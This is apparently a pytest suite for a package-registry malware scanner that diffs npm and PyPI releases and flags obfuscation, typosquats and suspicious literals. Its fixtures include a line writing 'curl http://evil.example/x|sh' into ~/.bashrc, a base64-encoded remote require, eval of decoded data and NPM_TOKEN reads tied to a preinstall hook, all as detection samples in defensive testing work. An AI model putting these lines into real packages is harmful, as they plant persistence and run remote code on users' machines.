"""Coverage for artifact diffs, media, obfuscation signals, typosquats, and analyst routing."""

import io
import json
import logging
import zipfile
from pathlib import Path

from hunter.archives import extract_archive
from hunter.classify import classify_files, has_warning_sign, jev_unsure
from hunter.config import Config
from hunter.db import Database
from hunter.head import load_head
from hunter.investigate import ANALYSIS_CHECKLIST, build_evidence, should_investigate
from hunter.logging_setup import configure_logging
from hunter.models import Classification, ReleaseMeta
from hunter.questions import PASS_A_IDS, PASS_B_IDS
from hunter.registry import load_npm_watchlist
from hunter.service import ReleaseLoader, poll_npm, poll_pypi
from hunter.triage import diff_trees
from hunter.typosquat import NameIndex
from hunter.webhook import should_deliver_analysis
from tests.archives_factory import tar_bytes
from hunter.fake_jev import KeywordJev


def _meta(name: str = "widget") -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem="npm",
        name=name,
        new_version="1.0.1",
        old_version="1.0.0",
        rank=3,
        registry_url="https://example.test/widget",
    )


def _zip_bytes(files: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in files.items():
            archive.writestr(name, data)
    return buffer.getvalue()


class _Gate:
    """Pass A steganography is unsure. Every other Noul is a clear no."""

    def __init__(self, level: float = 0.55):
        self.level = level

    def system_one(self, state, questions):
        from hunter.jev import ChoiceView, JevResult, NoulView, ScoreView

        result = JevResult(model="jev-1.13.0")
        for key, question in questions.items():
            if question["type"] == "noul":
                value = self.level if key == "steganography" else 0.04
                result.nouls[key] = NoulView(value)
            elif question["type"] == "choice":
                options = list(question["criteria"])
                result.choices[key] = ChoiceView(options[0], {options[0]: 1.0}, 0.5)
            else:
                result.scores[key] = ScoreView(0.0, {"0": 1.0}, 0.5, {"0": "local"})
        return result


def test_pass_a_asks_persistence_network_and_steganography():
    assert "persistence_path" in PASS_A_IDS
    assert "network" in PASS_A_IDS
    assert "steganography" in PASS_A_IDS
    assert "encoded_dynamic_import" in PASS_B_IDS


def test_pypi_loader_diffs_sdist_and_wheel():
    sdist = tar_bytes({"pkg/setup.py": "from setuptools import setup\nsetup(name='pkg')\n"})
    wheel = _zip_bytes({"pkg/hidden.py": b"eval('payload')\n"})
    document = {
        "info": {"author": "ada"},
        "releases": {
            "1.0.0": [
                {
                    "packagetype": "sdist",
                    "filename": "pkg-1.0.0.tar.gz",
                    "url": "https://files.example/old.tar.gz",
                    "upload_time_iso_8601": "2026-01-01T00:00:00Z",
                }
            ],
            "1.0.1": [
                {
                    "packagetype": "sdist",
                    "filename": "pkg-1.0.1.tar.gz",
                    "url": "https://files.example/new.tar.gz",
                    "upload_time_iso_8601": "2026-02-01T00:00:00Z",
                },
                {
                    "packagetype": "bdist_wheel",
                    "filename": "pkg-1.0.1-py3-none-any.whl",
                    "url": "https://files.example/new.whl",
                    "upload_time_iso_8601": "2026-02-01T00:00:00Z",
                },
            ],
        },
    }

    def transport(url, _timeout):
        if url.endswith("new.tar.gz") or url.endswith("old.tar.gz"):
            return sdist
        if url.endswith("new.whl"):
            return wheel
        return json.dumps(document).encode()

    loader = ReleaseLoader(Config(pypi_base="https://pypi.example/pypi"), transport)
    old_files, new_files, meta = loader.load_versions("pypi", "pkg", "1.0.0", "1.0.1")
    assert meta.old_version == "1.0.0"
    assert any(path.startswith("sdist/") for path in new_files)
    assert any(path.startswith("wheel/") and path.endswith("hidden.py") for path in new_files)
    assert all(not path.startswith("wheel/") for path in old_files)


def test_binary_media_is_kept_as_a_marker():
    raw = io.BytesIO()
    import tarfile

    with tarfile.open(fileobj=raw, mode="w:gz") as archive:
        data = b"RIFF\x00\x00payload"
        info = tarfile.TarInfo("package/tone.wav")
        info.size = len(data)
        archive.addfile(info, io.BytesIO(data))
    files = extract_archive(raw.getvalue())
    text = files["package/tone.wav"]
    assert text.startswith("[binary-or-media-file]")
    assert "sha256_prefix:" in text
    diffs = diff_trees({}, files)
    assert any(item.category == "binary_media" for item in diffs)


def test_persistence_and_hostname_are_not_cleared_at_pass_a():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": (
            "function add(a, b) { return a + b; }\n"
            "require('fs').appendFileSync(process.env.HOME + '/.bashrc', 'curl http://evil.example/x|sh');\n"
        )
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert "pass_a_gate" not in result.signals
    assert result.needs_llm_review
    assert should_investigate(result)
    assert "literal_persistence" in result.signals or "literal_new_host" in result.signals


def test_xor_and_encoded_import_are_explicit_signals():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": (
            "function add(a, b) { return a + b; }\n"
            "function xor(value) { return value.charCodeAt(0) ^ 0x42; }\n"
            "require(atob('aHR0cDovL2V2aWwuZXhhbXBsZS8x'));\n"
        )
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert "literal_xor" in result.signals
    assert "literal_encoded_import" in result.signals
    assert "pass_a_gate" not in result.signals
    assert result.needs_llm_review


def test_minified_side_payload_is_a_signal():
    ordinary = "function add(a, b) { return a + b; }\n"
    line = "".join(chr(33 + ((i * 17) % 90)) for i in range(220))
    old = {"index.js": ordinary}
    new = {"index.js": ordinary, "payload.js": line + "\n"}
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert "literal_minified_payload" in result.signals


def test_a_changed_media_file_alone_does_not_send_an_unsure_release_to_triage():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": "function add(a, b) { return a + b; }\n",
        "tone.wav": "[binary-or-media-file]\nkind: media\nbytes: 12\nsha256_prefix: abc\nextension: .wav\n",
    }
    for level in (0.55, 0.9):
        result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=_Gate(level), head=load_head())
        assert result.band == "benign"
        assert "binary_media_change" in result.signals
        assert result.needs_llm_review is False


def test_steganography_with_a_new_decoder_goes_to_the_analyst():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": (
            "function add(a, b) { return a + b; }\n"
            "function unpack(value) { return value.charCodeAt(0) ^ 0x42; }\n"
        ),
        "tone.wav": "[binary-or-media-file]\nkind: media\nbytes: 12\nsha256_prefix: abc\nextension: .wav\n",
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=_Gate(0.9), head=load_head())
    assert "pass_a_gate" not in result.signals
    assert result.needs_llm_review
    assert "binary_media_change" in result.signals
    assert "literal_xor" in result.signals
    evidence = build_evidence(result, "tone.wav changed")
    assert "steganography" in evidence["task"].lower()
    assert "XOR" in evidence["task"]


def test_typosquat_names_and_feed_queue(tmp_path):
    index = NameIndex(["requests", "left-pad", "lodash", "colors"])
    assert index.match("reqeusts") == "requests"
    assert index.match("leftpad") == "left-pad"
    assert index.match("l0dash") == "lodash"
    assert index.match("colors") is None
    assert index.match("color") == "colors"
    assert index.match("@types/lodash") is None
    assert index.match("@evil/requests") is None

    db = Database(tmp_path / "hunter.sqlite3")
    db.replace_watchlist("pypi", [("requests", 3, 1000)])
    db.set_checkpoint("pypi", "10")

    class Feed:
        def since(self, serial):
            assert serial == 10
            return [
                ("Requests", "2.0.0", 0, "new release", 11),
                ("reqeusts", "1.0.0", 0, "new release", 12),
            ]

    assert poll_pypi(db, Feed()) == 2
    jobs = {(row["name"], row["version"]) for row in db.pending_jobs()}
    assert ("requests", "2.0.0") in jobs
    assert ("reqeusts", "1.0.0") in jobs


def test_dependency_typosquat_floors_to_review():
    old = {
        "package.json": '{"name":"widget","version":"1.0.0","dependencies":{}}\n',
        "index.js": "function add(a, b) { return a + b; }\n",
    }
    new = {
        "package.json": '{"name":"widget","version":"1.0.1","dependencies":{"reqeusts":"1.0.0"}}\n',
        "index.js": "function add(a, b) { return a + b; }\nrequire('reqeusts');\n",
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=KeywordJev(), head=load_head())
    assert result.band == "review"
    assert any(signal.startswith("dependency_typosquat:") for signal in result.signals)
    assert should_investigate(result)


def test_npm_search_fallback_when_counts_has_no_tarball():
    def transport(url, _timeout):
        if "/-/v1/search" in url:
            body = {
                "objects": [
                    {"package": {"name": "left-pad"}, "downloads": {"monthly": 9}},
                    {"package": {"name": "express"}, "downloads": {"monthly": 4}},
                ]
            }
            return json.dumps(body).encode()
        return json.dumps({"dist": {}}).encode()

    rows = load_npm_watchlist(2, "https://registry.example", transport)
    assert rows[0][0] == "left-pad"
    assert rows[1][0] == "express"


def test_daily_log_records_a_classification_line(tmp_path):
    root = logging.getLogger()
    previous = list(root.handlers)
    try:
        configure_logging(tmp_path)
        logging.getLogger("hunter.service").info(
            "classified npm widget 1.0.0 -> 1.0.1 band=benign probability=0.050 llm=no signals=pass_a_gate"
        )
        files = list(Path(tmp_path).glob("hunter_*.log"))
        assert len(files) == 1
        assert "band=benign" in files[0].read_text(encoding="utf-8")
    finally:
        for handler in list(root.handlers):
            handler.close()
            root.removeHandler(handler)
        for handler in previous:
            root.addHandler(handler)


def test_benign_malicious_verdict_is_delivered_and_clear_no_is_not():
    evidence = {"primary_band": "benign", "malice_probability": 0.16}
    assert should_deliver_analysis(evidence, "malicious", confirmed_by="analyst")
    assert not should_deliver_analysis(evidence, "malicious")
    assert not should_deliver_analysis(evidence, "uncertain", confirmed_by="analyst")
    quiet = Classification(
        ecosystem="npm",
        name="widget",
        old_version="1",
        new_version="2",
        rank=1,
        registry_url="",
        band="benign",
        malice_probability=0.05,
        jev_model_id="jev-1.13.0",
        needs_llm_review=False,
    )
    unsure = Classification(
        ecosystem="npm",
        name="widget",
        old_version="1",
        new_version="2",
        rank=1,
        registry_url="",
        band="benign",
        malice_probability=0.16,
        jev_model_id="jev-1.13.0",
        needs_llm_review=True,
        signals=["network"],
    )
    warned = Classification(
        ecosystem="npm",
        name="widget",
        old_version="1",
        new_version="2",
        rank=1,
        registry_url="",
        band="benign",
        malice_probability=0.16,
        jev_model_id="jev-1.13.0",
        needs_llm_review=True,
        signals=["network", "literal_credential"],
    )
    assert not should_investigate(quiet)
    assert not should_investigate(unsure)
    assert should_investigate(warned)
    assert "unexpected hosts" in ANALYSIS_CHECKLIST


class _MidNoul:
    """One behavioral Noul sits in the unsure band. The rest are a clear no."""

    def __init__(self, hot: str, level: float = 0.45):
        self.hot = hot
        self.level = level

    def system_one(self, state, questions):
        from hunter.jev import ChoiceView, JevResult, NoulView, ScoreView

        result = JevResult(model="jev-1.13.0")
        for key, question in questions.items():
            if question["type"] == "noul":
                result.nouls[key] = NoulView(self.level if key == self.hot else 0.04)
            elif question["type"] == "choice":
                options = list(question["criteria"])
                result.choices[key] = ChoiceView(options[0], {options[0]: 1.0}, 0.5)
            else:
                result.scores[key] = ScoreView(0.0, {"0": 1.0}, 0.5, {"0": "local"})
        return result


def _ordinary_pair() -> tuple[dict[str, str], dict[str, str]]:
    old = {
        "package.json": '{"name":"widget","version":"1.0.0"}\n',
        "index.js": "function add(a, b) { return a + b; }\n",
    }
    new = {
        "package.json": '{"name":"widget","version":"1.0.1"}\n',
        "index.js": "function add(a, b) { return a + b; }\n// note\n",
    }
    return old, new


def test_warning_signs_are_local_facts_not_jev_answers():
    assert jev_unsure({"network": 0.45})
    assert not has_warning_sign(["network", "install_time_execution", "high_entropy_additions"])
    assert not has_warning_sign(["new_dependency:left-pad"])
    assert has_warning_sign(["lifecycle_script_edits"])
    assert has_warning_sign(["new_binary"])
    assert has_warning_sign(["literal_credential"])
    assert has_warning_sign(["literal_raw_ip"])
    assert has_warning_sign(["literal_new_host"])
    assert has_warning_sign(["literal_decode_exec"])
    assert has_warning_sign(["literal_shell"])
    assert has_warning_sign(["partial_read"])
    assert has_warning_sign(["behavior_chain:read credential, then send"])


def test_unsure_benign_without_a_warning_sign_skips_triage():
    old, new = _ordinary_pair()
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=_MidNoul("network"), head=load_head())
    assert result.band == "benign"
    assert jev_unsure(result.noul_probabilities)
    assert not has_warning_sign(result.signals)
    assert result.needs_llm_review is False
    assert not should_investigate(result)


def _route(new: dict[str, str], *, level: float = 0.9, old: dict[str, str] | None = None):
    base, _new = _ordinary_pair()
    return classify_files(
        meta=_meta(),
        old_files=old or base,
        new_files=new,
        jev=_MidNoul("network", level),
        head=load_head(),
    )


_ADD = "function add(a, b) { return a + b; }\n"
_PKG = '{"name":"widget","version":"1.0.1"}\n'
_SCRIPTED = '{"name":"widget","version":"1.0.1","scripts":{"preinstall":"node prepare.js"}}\n'


def test_an_install_script_edit_alone_does_not_route_an_unsure_release():
    result = _route(
        {
            "package.json": _SCRIPTED,
            "index.js": _ADD + "// note\n",
        }
    )
    assert result.band == "benign"
    assert "lifecycle_script_edits" in result.signals
    assert result.needs_llm_review is False
    assert not should_investigate(result)


def test_a_new_credential_read_routes_only_with_a_second_sign():
    alone = _route({"package.json": _PKG, "index.js": _ADD + "const token = process.env.NPM_TOKEN;\n"})
    assert alone.band == "benign"
    assert "literal_credential" in alone.signals
    assert alone.needs_llm_review is False
    paired = _route({"package.json": _SCRIPTED, "index.js": _ADD + "const token = process.env.NPM_TOKEN;\n"})
    assert paired.band == "benign"
    assert {"literal_credential", "lifecycle_script_edits"} <= set(paired.signals)
    assert paired.needs_llm_review is True
    assert should_investigate(paired)


def test_a_credential_read_the_old_version_already_had_does_not_route():
    old = {"package.json": '{"name":"widget","version":"1.0.0"}\n', "index.js": _ADD, "lib/auth.js": "const t = process.env.NPM_TOKEN;\n"}
    new = {
        "package.json": _SCRIPTED,
        "index.js": _ADD + "const token = process.env.NPM_TOKEN;\n",
        "lib/auth.js": "const t = process.env.NPM_TOKEN;\n",
    }
    result = _route(new, old=old)
    assert result.band == "benign"
    assert {"literal_credential", "lifecycle_script_edits"} <= set(result.signals)
    assert result.needs_llm_review is False


def test_new_network_or_decode_literals_route_a_sure_release():
    net = _route({"package.json": _PKG, "index.js": _ADD + "const host = '203.0.113.10';\n"})
    dec = _route(
        {
            "package.json": _PKG,
            "index.js": _ADD + "// note\n",
            "lib/helper.js": "function load() { return eval(Buffer.from('abc','base64')); }\n",
        }
    )
    assert net.band == "benign"
    assert "literal_raw_ip" in net.signals
    assert net.needs_llm_review is True
    assert should_investigate(net)
    assert dec.band == "benign"
    assert "literal_decode_exec" in dec.signals
    assert dec.needs_llm_review is True
    assert should_investigate(dec)


def test_a_mid_range_noul_below_the_route_level_stays_out_of_triage():
    result = _route({"package.json": _PKG, "index.js": _ADD + "const host = '203.0.113.10';\n"}, level=0.45)
    assert result.band == "benign"
    assert "literal_raw_ip" in result.signals
    assert result.needs_llm_review is False


def test_a_raw_ip_the_old_version_already_had_does_not_route():
    old = {"package.json": '{"name":"widget","version":"1.0.0"}\n', "index.js": _ADD, "lib/hosts.js": "const h = '203.0.113.10';\n"}
    new = {"package.json": _PKG, "index.js": _ADD + "const host = '203.0.113.10';\n", "lib/hosts.js": "const h = '203.0.113.10';\n"}
    result = _route(new, old=old)
    assert "literal_raw_ip" in result.signals
    assert result.needs_llm_review is False


def test_a_new_executable_still_reaches_triage():
    old = {
        "package.json": '{"name":"widget","version":"1.0.0"}\n',
        "index.js": "function add(a, b) { return a + b; }\n",
    }
    new = {
        **old,
        "build/addon.node": (
            "[binary-or-media-file]\nkind: binary\nbytes: 4\n"
            "sha256_prefix: ab\nextension: .node\nheader: elf\n"
        ),
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=_MidNoul("network"), head=load_head())
    assert "new_binary" in result.signals
    assert result.band == "review"
    assert should_investigate(result)


def test_npm_typosquat_outside_the_watchlist_is_queued(tmp_path):
    db = Database(tmp_path / "one.sqlite3")
    db.replace_watchlist("npm", [("left-pad", 4, 5000)])
    db.set_checkpoint("npm", "0")
    changes = [{"seq": "1", "id": "leftpad"}, {"seq": "2", "id": "unrelated-pkg"}]
    seen = []

    def transport(url, _timeout):
        seen.append(url)
        if "/_changes" in url:
            return json.dumps({"results": changes, "last_seq": "2"}).encode()
        if url.rstrip("/").endswith("/leftpad"):
            return json.dumps(
                {
                    "time": {"created": "2026-01-01T00:00:00.000Z", "1.2.0": "2026-04-01T00:00:00.000Z"},
                    "dist-tags": {"latest": "1.2.0"},
                    "versions": {"1.2.0": {}},
                }
            ).encode()
        raise AssertionError(url)

    from hunter.config import Config as HunterConfig

    config = HunterConfig(npm_changes="https://replicate.example", npm_registry="https://registry.example", npm_page_size=10)
    assert poll_npm(db, config, transport) == 1
    jobs = [(row["name"], row["version"]) for row in db.pending_jobs()]
    assert jobs == [("leftpad", "1.2.0")]
    assert not any(url.rstrip("/").endswith("/unrelated-pkg") for url in seen)


def test_scoped_names_are_compared_whole():
    # Live serve sent 19 of 20 Triage-bound releases here: scoped packages whose
    # part after the slash matched or nearly matched a popular unscoped name.
    index = NameIndex(["react", "util", "semver", "methods", "scheduler", "@angular/core", "@babel/core"])
    for name in ("@hyper-fetch/react", "@opencode/util", "@opencode/server", "@did-btcr2/method", "@keemakr/schedules"):
        assert index.match(name) is None, name
    assert index.match("@angulr/core") == "@angular/core"
    assert index.match("@angular/core") is None
    assert index.match("@babel/core") is None
